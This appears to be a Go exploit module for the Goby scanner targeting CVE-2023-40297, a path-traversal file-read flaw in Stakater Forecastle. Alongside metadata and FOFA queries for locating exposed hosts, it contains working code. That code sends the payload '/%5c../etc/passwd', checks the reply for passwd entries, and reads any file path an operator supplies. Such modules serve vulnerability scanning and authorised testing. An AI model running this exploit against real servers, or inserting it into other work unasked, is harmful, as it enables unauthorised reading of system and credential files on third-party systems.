package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "Forecastle file reading vulnerability (CVE-2023-40297)",
    "Description": "<p>Forecastle is a control plane that dynamically discovers and provides a launchpad to access applications deployed on Kubernetes.</p><p>Forecastle has a file reading vulnerability that allows an attacker to obtain sensitive information on the server.</p>",
    "Product": "Stakater-Forecastle",
    "Homepage": "https://www.stakater.com/",
    "DisclosureDate": "2023-08-14",
    "PostTime": "2024-03-01",
    "Author": "xjy",
    "FofaQuery": "body=\"content=\\\"Forecastle\" || title=\"Forecastle\"",
    "GobyQuery": "body=\"content=\\\"Forecastle\" || title=\"Forecastle\"",
    "Level": "1",
    "Impact": "<p>Forecastle has a file reading vulnerability that allows an attacker to obtain sensitive information on the server.</p>",
    "Recommendation": "<p>The manufacturer has released a patch to fix the vulnerability, please update in time: <a href=\"https://www.stakater.com/\">https://www.stakater.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "custom",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "/%5c../etc/passwd",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2023-40297"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "Forecastle 文件读取漏洞（CVE-2023-40297）",
            "Product": "Stakater-Forecastle",
            "Description": "<p>Forecastle 是一个控制面板，它动态发现并提供一个启动板来访问部署在 Kubernetes 上的应用程序。</p><p>Forecastle 存在文件读取漏洞，攻击者可利用该漏洞获取服务器敏感信息。</p>",
            "Recommendation": "<p>厂商已发布补丁以修复漏洞，请及时更新<span style=\"color: var(--primaryFont-color);\">：</span><a href=\"https://www.stakater.com/\">https://www.stakater.com/</a></p>",
            "Impact": "<p><span style=\"color: var(--primaryFont-color);\">Forecastle 存在文件读取漏洞，攻击者可利用该漏洞获取服务器敏感信息。</span><br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Forecastle file reading vulnerability (CVE-2023-40297)",
            "Product": "Stakater-Forecastle",
            "Description": "<p>Forecastle is a control plane that dynamically discovers and provides a launchpad to access applications deployed on Kubernetes.</p><p>Forecastle has a file reading vulnerability that allows an attacker to obtain sensitive information on the server.</p>",
            "Recommendation": "<p>The manufacturer has released a patch to fix the vulnerability, please update in time: <a href=\"https://www.stakater.com/\" target=\"_blank\">https://www.stakater.com/</a><br></p>",
            "Impact": "<p><span style=\"color: var(--primaryFont-color);\">Forecastle has a file reading vulnerability that allows an attacker to obtain sensitive information on the server.</span><br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10930"
}`
	sendPayloadbpKFkz := func(hostInfo *httpclient.FixUrl, filePath string) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewGetRequestConfig(filePath)
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, _ := sendPayloadbpKFkz(hostinfo, `/%5c../etc/passwd`)
			success := resp != nil && resp.StatusCode == 200 && len(regexp.MustCompile(`[\w-]+:[^:]+:\d+:\d+:[^:]*:[^:]+:[^:]+`).FindAllString(resp.Utf8Html, -1)) > 1
			if success {
				stepLogs.VulURL = hostinfo.FixedHostInfo + resp.Request.URL.Path + "?" + resp.Request.URL.RawQuery
			}
			return success
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "custom" {
				if resp, err := sendPayloadbpKFkz(expResult.HostInfo, goutils.B2S(stepLogs.Params["filePath"])); resp != nil && resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = resp.RawBody
				} else if err != nil {
					expResult.Output = err.Error()
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
